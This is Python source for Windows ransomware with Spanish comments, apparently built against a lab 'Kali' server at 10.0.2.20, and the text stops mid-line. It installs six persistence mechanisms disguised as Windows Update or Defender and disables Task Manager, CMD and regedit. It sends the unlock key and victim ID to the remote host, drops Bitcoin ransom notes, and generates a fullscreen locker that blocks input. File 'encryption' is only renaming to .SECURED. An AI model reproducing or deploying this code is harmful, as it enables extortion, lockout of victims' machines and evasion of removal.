import os
import sys
import random
import string
import requests
import time
import subprocess
import ctypes
import threading
import winreg
import getpass
import shutil
from pathlib import Path

class RansomwarePersistente:
    def __init__(self):
        self.directories_to_encrypt = [
            '~/Documents',
            '~/Downloads', 
            '~/Desktop',
            '~/Pictures',
            '~/Videos',
            '~/Music'
        ]
        
        self.excluded_dirs = [
            'Windows', 'Program Files', 'Program Files (x86)', 'System32',
            'Windows.old', 'Recovery', '$Recycle.Bin', 'AppData'
        ]
        
        self.kali_ip = "10.0.2.20"
        self.bitcoin = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
        self.price = 500
        self.url = f'http://{self.kali_ip}/victima.php'
        self.encryption_count = 0
        self.password = None
        self.victim_id = None
        self.script_path = os.path.abspath(__file__)
        self.script_name = os.path.basename(__file__)
        
    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def show_banner(self):
        """Muestra el banner ASCII"""
        banner = r"""
         _nnnn_                      
        dGGGGMMb     .-~-.
       @p~qp~~qMb   / .-. \ 
       M|@||@) M|  |  `-'  |
       @,----.JM|   \ `-' / 
      JS^\__/  qKL .-`--'-.
     dZP        qKRb |     |
    dZP          qKKb|     |
   fZP            SMMb|     |
   HZM            MMMM|     |
   FqM            MMMM|     |
 __| ".        |\dS"qML|     |
 |    `.       | `' \Zq|     |
_)      \.___.,|     .' \   /
\____   )MMMMMP|   .'    '-'
     `-'       `--'       

  _   _                 _           
 | | | | ___  _ __ ___ (_)_ __ ___  
 | |_| |/ _ \| '_ ` _ \| | '_ ` _ \ 
 |  _  | (_) | | | | | | | | | | | |
 |_| |_|\___/|_| |_| |_|_|_| |_| |_|

==================================================
        TU INFORMACION HA SIDO SECUESTRADA
==================================================
"""
        print(banner)

    def copy_to_system_location(self):
        """Copia el script a una ubicacion del sistema"""
        try:
            system_path = os.path.join(os.environ['SystemRoot'], 'System32', 'WindowsUpdate.exe')
            if not os.path.exists(system_path):
                shutil.copy2(self.script_path, system_path)
                # Ocultar el archivo
                subprocess.run(f'attrib +h +s "{system_path}"', shell=True, capture_output=True)
                print("[+] Script copiado a ubicacion del sistema")
                return system_path
            return system_path
        except Exception as e:
            print("[-] Error copiando a sistema:", e)
            return self.script_path

    def install_python_dependencies(self):
        """Instala las dependencias de Python si no existen"""
        print("[*] Verificando dependencias del sistema...")
        
        try:
            import requests
            print("[+] Libreria requests encontrada")
        except ImportError:
            print("[-] Instalando libreria requests...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
                print("[+] Requests instalado correctamente")
            except Exception as e:
                print("[-] Error instalando requests:", e)
                return False
                
        return True

    def install_persistence(self):
        """Instala multiples metodos de persistencia"""
        print("[*] Configurando persistencia del sistema...")
        
        try:
            # Copiar a ubicacion del sistema primero
            system_script_path = self.copy_to_system_location()
            
            # Metodo 1: Registro de Windows - Run (Current User)
            self._install_registry_persistence(system_script_path)
            
            # Metodo 2: Registro de Windows - Run (Local Machine - requiere admin)
            if self.is_admin():
                self._install_registry_local_machine(system_script_path)
            
            # Metodo 3: Tareas Programadas
            self._install_scheduled_task(system_script_path)
            
            # Metodo 4: Carpeta Startup
            self._install_startup_folder(system_script_path)
            
            # Metodo 5: Servicio de Windows (si es admin)
            if self.is_admin():
                self._install_windows_service(system_script_path)
                
            # Metodo 6: RunOnce para sobrevivir a algunas limpiezas
            self._install_runonce_persistence(system_script_path)
                
            print("[+] Configuracion de persistencia completada")
            return True
            
        except Exception as e:
            print("[-] Error en configuracion de persistencia:", e)
            return False

    def _install_registry_persistence(self, script_path):
        """Instala persistencia en el registro de Windows (Current User)"""
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            print("   [+] Persistencia en registro HKCU configurada")
            
        except Exception as e:
            print("   [-] Error en registro HKCU:", e)

    def _install_registry_local_machine(self, script_path):
        """Instala persistencia en el registro de Windows (Local Machine)"""
        try:
            key = winreg.HKEY_LOCAL_MACHINE
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            print("   [+] Persistencia en registro HKLM configurada")
            
        except Exception as e:
            print("   [-] Error en registro HKLM:", e)

    def _install_scheduled_task(self, script_path):
        """Crea una tarea programada"""
        try:
            task_name = "WindowsDefenderUpdate"
            
            # Crear tarea usando schtasks directamente
            command = f'schtasks /create /tn "{task_name}" /tr "\"{sys.executable}\" \"{script_path}\"" /sc onlogon /rl highest /f'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print("   [+] Tarea programada configurada")
            else:
                # Intentar metodo alternativo
                self._create_task_xml(script_path)
                
        except Exception as e:
            print("   [-] Error en tarea programada:", e)

    def _create_task_xml(self, script_path):
        """Crea tarea programada usando XML"""
        try:
            task_name = "MicrosoftWindowsUpdate"
            xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Microsoft Windows Update</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{sys.executable}"</Command>
      <Arguments>"{script_path}"</Arguments>
    </Exec>
  </Actions>
</Task>'''
            
            xml_path = os.path.join(os.environ['TEMP'], 'task.xml')
            with open(xml_path, 'w') as f:
                f.write(xml_content)
            
            subprocess.run(f'schtasks /create /tn "{task_name}" /xml "{xml_path}" /f', shell=True, capture_output=True)
            os.remove(xml_path)
            print("   [+] Tarea programada (XML) configurada")
            
        except Exception as e:
            print("   [-] Error en tarea XML:", e)

    def _install_startup_folder(self, script_path):
        """Copia el script a la carpeta de inicio"""
        try:
            startup_folder = os.path.join(
                os.path.expanduser('~'),
                'AppData',
                'Roaming',
                'Microsoft',
                'Windows',
                'Start Menu',
                'Programs',
                'Startup'
            )
            
            if os.path.exists(startup_folder):
                # Crear archivo batch
                bat_content = f'@echo off\nstart "" /min "{sys.executable}" "{script_path}"\n'
                bat_path = os.path.join(startup_folder, 'WindowsUpdate.bat')
                
                with open(bat_path, 'w') as f:
                    f.write(bat_content)
                    
                # Ocultar archivo
                subprocess.run(f'attrib +h +s "{bat_path}"', shell=True, capture_output=True)
                print("   [+] Persistencia en inicio configurada")
                
        except Exception as e:
            print("   [-] Error en carpeta de inicio:", e)

    def _install_windows_service(self, script_path):
        """Instala como servicio de Windows (requiere admin)"""
        try:
            service_name = "WinDefenderUpdate"
            
            # Verificar si el servicio ya existe
            result = subprocess.run(f'sc query "{service_name}"', shell=True, capture_output=True)
            if result.returncode != 0:
                # Crear servicio
                subprocess.run([
                    'sc', 'create', service_name,
                    f'binpath= "{sys.executable} {script_path}"',
                    'start= auto',
                    'displayname= "Windows Defender Update Service"'
                ], capture_output=True, shell=True)
                
                subprocess.run(['sc', 'start', service_name], capture_output=True, shell=True)
                print("   [+] Servicio de Windows instalado")
            else:
                print("   [+] Servicio de Windows ya existe")
            
        except Exception as e:
            print("   [-] Error en servicio Windows:", e)

    def _install_runonce_persistence(self, script_path):
        """Instala persistencia en RunOnce"""
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            print("   [+] Persistencia RunOnce configurada")
            
        except Exception as e:
            print("   [-] Error en RunOnce:", e)

    def check_persistence(self):
        """Verifica si ya hay persistencia instalada"""
        try:
            # Verificar registro HKCU
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as reg_key:
                try:
                    value, _ = winreg.QueryValueEx(reg_key, "WindowsUpdate")
                    return True
                except FileNotFoundError:
                    pass
                    
            return False
            
        except:
            return False

    def expand_paths(self):
        expanded_dirs = []
        for directory in self.directories_to_encrypt:
            expanded_path = os.path.expanduser(directory)
            if os.path.exists(expanded_path):
                expanded_dirs.append(expanded_path)
        return expanded_dirs if expanded_dirs else ['.']

    def should_encrypt(self, filepath):
        file_str = str(filepath).lower()
        
        for excluded in self.excluded_dirs:
            if excluded.lower() in file_str:
                return False
        
        try:
            if filepath.stat().st_size < 100:
                return False
        except:
            return False
            
        valid_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', 
                          '.jpg', '.jpeg', '.png', '.mp3', '.mp4', '.avi',
                          '.zip', '.rar', '.odt', '.ppt', '.pptx', '.sql',
                          '.db', '.mdb', '.accdb', '.csv', '.xml', '.json']
        
        return any(file_str.endswith(ext) for ext in valid_extensions)

    def generate_keys(self):
        s = string.ascii_lowercase + string.digits + string.ascii_uppercase
        self.password = ''.join(random.sample(s, 35))
        self.victim_id = 'VICTIM_' + ''.join(random.sample(string.ascii_uppercase + string.digits, 8))

    def test_connection(self):
        """Testea la conexion con el servidor Kali"""
        print("[*] Verificando conectividad de red...")
        try:
            result = os.system(f"ping -n 2 {self.kali_ip} >nul 2>nul")
            if result == 0:
                print("[+] Conexion de red estable")
            else:
                print("[-] Sin conectividad de red")
                return False
            
            response = requests.get(f'http://{self.kali_ip}/victima.php', timeout=10)
            print("[+] Servidor remoto accesible")
            return True
            
        except Exception as e:
            print("[-] Error de conexion:", str(e))
            return False

    def send_credentials(self):
        """Envia credenciales al servidor Kali"""
        print("[*] Transmitiendo credenciales...")
        try:
            values = {'pass': self.password, 'id': self.victim_id}
            response = requests.post(self.url, data=values, timeout=15)
            
            if response.text.strip() == 'Ok.':
                print("[+] Credenciales transmitidas exitosamente")
                print("   ID: " + self.victim_id)
                print("   Clave: " + self.password)
                return True
            else:
                print("[-] Respuesta inesperada del servidor")
                self.save_credentials_local()
                return False
                
        except Exception as e:
            print("[-] Error en transmision:", str(e))
            self.save_credentials_local()
            return False

    def save_credentials_local(self):
        """Guarda credenciales localmente"""
        try:
            with open('RECUPERACION.txt', 'w', encoding='utf-8') as f:
                f.write("=== INFORMACION DE RECUPERACION ===\n\n")
                f.write(f"ID de Victima: {self.victim_id}\n")
                f.write(f"Clave de Desbloqueo: {self.password}\n")
                f.write(f"Criptomoneda: Bitcoin\n")
                f.write(f"Direccion: {self.bitcoin}\n")
                f.write(f"Monto Requerido: ${self.price} USD\n")
                f.write(f"Servidor: {self.kali_ip}\n\n")
                f.write("Contacte al administrador del sistema\n")
            print("[+] Informacion de recuperacion guardada")
        except Exception as e:
            print("[-] Error guardando informacion:", e)

    def encrypt_file_windows(self, filepath):
        try:
            if not self.should_encrypt(filepath):
                return False
                
            new_name = str(filepath) + '.SECURED'
            os.rename(filepath, new_name)
            self.encryption_count += 1
            return True
                
        except:
            return False

    def encrypt_directory(self, directory):
        encrypted_files = 0
        try:
            for root, dirs, files in os.walk(directory):
                # Excluir directorios del sistema
                dirs[:] = [d for d in dirs if not any(excl.lower() in os.path.join(root, d).lower() for excl in self.excluded_dirs)]
                
                for file in files:
                    filepath = Path(root) / file
                    if self.encrypt_file_windows(filepath):
                        encrypted_files += 1
                        if encrypted_files % 100 == 0:
                            print(f"   Procesados: {encrypted_files} archivos...")
            return encrypted_files
        except Exception as e:
            print("   Error en directorio:", e)
            return 0

    def create_ransom_note(self):
        note = r"""
================================================================
                   SISTEMA SECUESTRADO
================================================================

         _nnnn_                      
        dGGGGMMb     .-~-.
       @p~qp~~qMb   / .-. \ 
       M|@||@) M|  |  `-'  |
       @,----.JM|   \ `-' / 
      JS^\__/  qKL .-`--'-.
     dZP        qKRb |     |
    dZP          qKKb|     |
   fZP            SMMb|     |
   HZM            MMMM|     |
   FqM            MMMM|     |
 __| ".        |\dS"qML|     |
 |    `.       | `' \Zq|     |
_)      \.___.,|     .' \   /
\____   )MMMMMP|   .'    '-'
     `-'       `--'       

TU INFORMACION HA SIDO SECUESTRADA Y CIFRADA

INFORMACION PARA LA RECUPERACION:
--------------------------------
* ID UNICO: {victim_id}
* PAGO REQUERIDO: ${price} en Bitcoin
* DIRECCION BITCOIN: {bitcoin}

ADVERTENCIAS CRITICAS:
----------------------
* EL SISTEMA SE REINICIARA AUTOMATICAMENTE
* LA INFECCION PERSISTIRA TRAS REINICIOS
* NO INTENTE ELIMINAR EL SOFTWARE MANUALMENTE
* NO REINSTALE EL SISTEMA OPERATIVO

Para recuperar el acceso, ejecute el archivo RECUPERAR.exe
e ingrese la clave de desbloqueo proporcionada.

================================================================
""".format(victim_id=self.victim_id, price=self.price, bitcoin=self.bitcoin)
        
        locations = [
            os.path.expanduser('~/Desktop/LECTURA_URGENTE.txt'),
            os.path.expanduser('~/Documents/INSTRUCCIONES.txt'),
            'C:/AVISO_IMPORTANTE.txt',
            'RECUPERACION.txt'
        ]
        
        for location in locations:
            try:
                with open(location, 'w', encoding='utf-8') as f:
                    f.write(note)
                print("[+] Nota creada: " + location)
            except Exception as e:
                print("[-] Error creando nota:", location, str(e))

    def disable_system_tools(self):
        """Deshabilita herramientas del sistema"""
        print("[*] Configurando restricciones de seguridad...")
        
        try:
            # Deshabilitar Task Manager
            os.system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul')
            
            # Deshabilitar CMD
            os.system('reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f 2>nul')
            
            # Deshabilitar registro
            os.system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f 2>nul')
            
            print("[+] Restricciones de seguridad aplicadas")
        except Exception as e:
            print("[-] Error aplicando restricciones:", e)

    def kill_system_processes(self):
        """Termina procesos del sistema"""
        tools = [
            'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'regedit.exe',
            'msconfig.exe', 'compmgmt.msc', 'perfmon.exe', 'eventvwr.exe'
        ]
        
        for tool in tools:
            try:
                os.system(f'taskkill /f /im {tool} 2>nul')
            except:
                pass

    def create_lock_interface(self):
        """Crea la interfaz de bloqueo"""
        lock_code = f'''
import tkinter as tk
import tkinter.messagebox as messagebox
import sys
import os
import subprocess
import threading
import time

class SystemLocker:
    def __init__(self, victim_id, password):
        self.victim_id = victim_id
        self.password = password
        self.root = tk.Tk()
        self.setup_interface()
        self.start_security_monitor()
        
    def setup_interface(self):
        # Configuracion de ventana
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        self.root.bind("<Key>", self.block_system_keys)
        self.root.bind("<Button>", self.block_clicks)
        
        # Marco principal
        main_frame = tk.Frame(self.root, bg="black")
        main_frame.pack(expand=True, fill="both", padx=20, pady=20)
        
        # Banner
        banner_text = r"""
         _nnnn_                      
        dGGGGMMb     .-~-.
       @p~qp~~qMb   / .-. \ 
       M|@||@) M|  |  `-'  |
       @,----.JM|   \ `-' / 
      JS^\\\\__/  qKL .-`--'-.
     dZP        qKRb |     |
    dZP          qKKb|     |
   fZP            SMMb|     |
   HZM            MMMM|     |
   FqM            MMMM|     |
 __| ".        |\\\\dS"qML|     |
 |    `.       | `' \\\\Zq|     |
_)      \\\\.___.,|     .' \\\\   /
\\\\____   )MMMMMP|   .'    '-'
     `-'       `--'       
"""
        
        banner = tk.Label(
            main_frame,
            text=banner_text,
            font=("Courier New", 8),
            fg="red",
            bg="black",
            justify="left"
        )
        banner.pack(pady=10)
        
        # Titulo
        title = tk.Label(
            main_frame,
            text="SISTEMA SECUESTRADO - ACCESO DENEGADO",
            font=("Arial", 20, "bold"),
            fg="red",
            bg="black"
        )
        title.pack(pady=5)
        
        # Mensaje
        message = tk.Label(
            main_frame,
            text="Todos sus archivos han sido cifrados con encryption militar\\\\nSistema persistente - Se reactivara automaticamente",
            font=("Arial", 14),
            fg="white",
            bg="black"
        )
        message.pack(pady=10)
        
        # ID de victima
        victim_label = tk.Label(
            main_frame,
            text=f"IDENTIFICACION: {self.victim_id}",
            font=("Arial", 12, "bold"),
            fg="yellow",
            bg="black"
        )
        victim_label.pack(pady=5)
        
        # Campo de entrada
        input_frame = tk.Frame(main_frame, bg="black")
        input_frame.pack(pady=20)
        
        tk.Label(
            input_frame,
            text="CLAVE DE DESBLOQUEO:",
            font=("Arial", 12),
            fg="white",
            bg="black"
        ).pack()
        
        self.pass_entry = tk.Entry(
            input_frame,
            font=("Arial", 14),
            width=35,
            show="*",
            bg="white",
            fg="black"
        )
        self.pass_entry.pack(pady=10)
        self.pass_entry.focus()
        
        # Boton de verificacion
        verify_btn = tk.Button(
            input_frame,
            text="VALIDAR CLAVE",
            font=("Arial", 12, "bold"),
            bg="red",
            fg="white",
            command=self.verify_access,
            width=20,
            height=2
        )
        verify_btn.pack(pady=10)
        
        # Contador
        self.counter = 0
        self.counter_label = tk.Label(
            main_frame,
            text="Sistema bloqueado: 0 segundos",
            font=("Arial", 10),
            fg="gray",
            bg="black"
        )
        self.counter_label.pack(side="bottom", pady=10)
        
    def block_system_keys(self, event):
        # Bloquear combinaciones de teclas del sistema
        blocked_keys = ["Escape", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12"]
        if event.keysym in blocked_keys:
            return "break"
            
    def block_clicks(self, event):
        return "break"
        
    def verify_access(self):
        input_pass = self.pass_entry.get()
        if input_pass == self.password:
            self.unlock_system()
        else:
            messagebox.showerror("ERROR", "Clave de desbloqueo incorrecta\\\\nSistema permanece bloqueado")
            self.pass_entry.delete(0, tk.END)
            
    def unlock_system(self):
        try:
            # Ejecutar script de recuperacion
            if os.path.exists("RECUPERAR.py"):
                subprocess.Popen([sys.executable, "RECUPERAR.py"])
        except:
            pass
            
        self.root.destroy()
        sys.exit()
        
    def update_counter(self):
        self.counter += 1
        hours = self.counter // 3600
        minutes = (self.counter % 3600) // 60
        seconds = self.counter % 60
        self.counter_label.config(text=f"Sistema bloqueado: {{hours:02d}}:{{minutes:02d}}:{{seconds:02d}}")
        self.root.after(1000, self.update_counter)
        
    def start_security_monitor(self):
        def security_loop():
            while True:
                try:
                    # Terminar herramientas del sistema
                    os.system("taskkill /f /im taskmgr.exe 2>nul")
                    os.system("taskkill /f /im cmd.exe 2>nul")
                    os.system("taskkill /f /im powershell.exe 2>nul")
                    os.system("taskkill /f /im regedit.exe 2>nul")
                    time.sleep(2)
                except:
                    pass
                    
        monitor_thread = threading.Thread(target=security_loop)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        self.update_counter()
        
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    if len(sys.argv) >= 3:
        victim_id = sys.argv[1]
        password = sys.argv[2]
        locker = SystemLocker(victim_id, password)
        locker.run()
'''
        
        try:
            with open('locker.py', 'w', encoding='utf-8') as f:
                f.write(lock_code)
            print("[+] Interfaz de bloqueo creada")
        except Exception as e:
            print("[-] Error creando interfaz:", e)

    def start_lock_interface(self):
        """Inicia la interfaz de bloqueo"""
        try:
            subprocess.Popen([
                sys.executable, 'locker.py', 
                self.victim_id, self.password
            ], creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception as e:
            print("[-] Error iniciando interfaz:", e)

    def create_recovery_tool(self):
        """Crea la herramienta de recuperacion"""
        recovery_code = f'''import os
import sys
import winreg
import subprocess

VICTIM_ID = "{self.victim_id}"
CORRECT_PASSWORD = "{self.password}"

def remove_persistence():
    """Elimina todos los metodos de persistencia"""
    print("=== HERRAMIENTA DE RECUPERACION ===\\\\n")
    
    removed_items = 0
    
    # Remover del registro HKCU
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            try:
                winreg.DeleteValue(reg_key, "WindowsUpdate")
                print("[+] Entrada de registro HKCU eliminada")
                removed_items += 1
            except:
                pass
    except Exception as e:
        print("[-] Error eliminando registro HKCU:", e)
    
    # Remover del registro HKLM
    try:
        key = winreg.HKEY_LOCAL_MACHINE
        subkey = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            try:
                winreg.DeleteValue(reg_key, "WindowsUpdateService")
                print("[+] Entrada de registro HKLM eliminada")
                removed_items += 1
            except:
                pass
    except:
        pass
    
    # Remover tareas programadas
    tasks = ["WindowsDefenderUpdate", "MicrosoftWindowsUpdate"]
    for task in tasks:
        try:
            os.system(f'schtasks /delete /tn "{{task}}" /f 2>nul')
            print(f"[+] Tarea programada {{task}} eliminada")
            removed_items += 1
        except:
            pass
    
    # Remover archivos de inicio
    try:
        startup_folder = os.path.join(
            os.path.expanduser('~'),
            'AppData', 'Roaming', 'Microsoft', 'Windows',
            'Start Menu', 'Programs', 'Startup'
        )
        bat_file = os.path.join(startup_folder, 'WindowsUpdate.bat')
        if os.path.exists(bat_file):
            os.remove(bat_file)
            print("[+] Archivo de inicio eliminado")
            removed_items += 1
    except:
        pass
    
    # Remover servicio
    try:
        os.system('sc delete "WinDefenderUpdate" 2>nul')
        print("[+] Servicio eliminado")
        removed_items += 1
    except:
        pass
    
    # Remover archivo del sistema
    try:
        system_file = os.path.join(os.environ['SystemRoot'], 'System32', 'WindowsUpdate.exe')
        if os.path.exists(system_file):
            os.remove(system_file)
            print("[+] Archivo del sistema eliminado")
            removed_items += 1
    except:
        pass
    
    return removed_items

def decrypt_files():
    """Descifra los archivos"""
    print("\\\\n[*] Iniciando proceso de descifrado...")
    
    decrypted_count = 0
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if file.endswith('.SECURED'):
                try:
                    original_path = os.path.join(root, file)
                    new_path = original_path[:-8]  # Remove .SECURED
                    os.rename(original_path, new_path)
                    decrypted_count += 1
                    if decrypted_count % 50 == 0:
                        print(f"   Procesados: {{decrypted_count}} archivos...")
                except Exception as e:
                    print(f"   Error con {{file}}: {{e}}")
    
    return decrypted_count

def clean_system():
    """Limpia archivos del ransomware"""
    files_to_remove = [
        "locker.py", "LECTURA_URGENTE.txt", 
        "INSTRUCCIONES.txt", "AVISO_IMPORTANTE.txt",
        "RECUPERACION.txt", "RECUPERAR.py"
    ]
    
    removed_files = 0
    for file in files_to_remove:
        try:
            if os.path.exists(file):
                os.remove(file)
                print(f"[+] Archivo {{file}} eliminado")
                removed_files += 1
        except:
            pass
    
    return removed_files

def main():
    # Verificar clave
    print("=== SISTEMA DE RECUPERACION ===\\\\n")
    input_pass = input("Ingrese la clave de desbloqueo: ")
    
    if input_pass != CORRECT_PASSWORD:
        print("\\\\n[-] CLAVE INCORRECTA")
        print("[-] El sistema permanecera bloqueado")
        input("Presione Enter para salir...")
        return
    
    print("\\\\n[+] CLAVE VERIFICADA CORRECTAMENTE")
    print("[+] Iniciando proceso de recuperacion...")
    
    # Paso 1: Remover persistencia
    print("\\\\n[*] Eliminando persistencia...")
    persistence_removed = remove_persistence()
    
    # Paso 2: Descifrar archivos
    print("\\\\n[*] Descifrando archivos...")
    total_decrypted = decrypt_files()
    
    # Paso 3: Limpiar sistema
    print("\\\\n[*] Limpiando sistema...")
    files_removed = clean_system()
    
    print(f"\\\\n[+] RECUPERACION COMPLETADA")
    print(f"[+] Elementos de persistencia eliminados: {{persistence_removed}}")
    print(f"[+] Archivos restaurados: {{total_decrypted}}")
    print(f"[+] Archivos de ransomware eliminados: {{files_removed}}")
    print("[+] Sistema liberado exitosamente")
    
    input("\\\\nPresione Enter para cerrar...")

if __name__ == "__main__":
    main()
'''
        
        try:
            with open('RECUPERAR.py', 'w', encoding='
